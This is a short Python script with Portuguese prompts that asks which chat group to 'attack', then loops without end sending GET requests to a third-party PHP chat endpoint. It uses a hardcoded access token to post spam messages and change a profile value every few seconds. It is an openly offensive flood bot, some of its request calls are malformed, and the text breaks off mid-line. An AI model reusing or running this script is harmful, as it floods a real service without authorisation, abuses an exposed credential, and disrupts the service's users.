import requests
import time
import random
print ("deseja atacar qual grupo? [1>5]")
s = int(input(""))
i = 1
#animacao
print ("\ncarregando...")
animation = [
"────────────────────","   ───────────────────","─   ──────────────────","──   ─────────────────","───   ────────────────","────   ───────────────","─────   ──────────────","──────   ─────────────","───────   ────────────","────────   ───────────","─────────   ──────────","──────────   ─────────","───────────   ────────","────────────   ───────","─────────────   ──────","──────────────   ─────","───────────────   ────","────────────────   ───","─────────────────   ──","──────────────────   ─","───────────────────   "
]
while i <= 100:
        print(animation[i % len(animation)], end='\r')
        time.sleep(.03)
        i += 1
#animacao
print ("selecionado grupo ",s)
mss = "python requests"
user = "bot"
n = 1
r = random.randint(1,4)
while 2 >= 1:
 requests.get('http://d90930x1.beget.tech/PocketCodeDB/DATABASE/get/get.php?slot=',s,'&token=42390499498Thaylan44596846613&get_pe='+mss)
 print ("\033[00;037mmensagem `"+mss+"` enviada com sucesso!")
 print ("\033[00;032msucesso na solicitação ",n)
 n += 1
 time.sleep(3)
 r = random.randint(1,4)
 print ("\033[03;034mperfil atualizado para ",r)
 requests.get('http://d90930x1.beget.tech/PocketCodeDB/DATABASE/get/get.php?slot=13&token=42390499498Thaylan44596846613&get_pe=',r)
 print ("\0
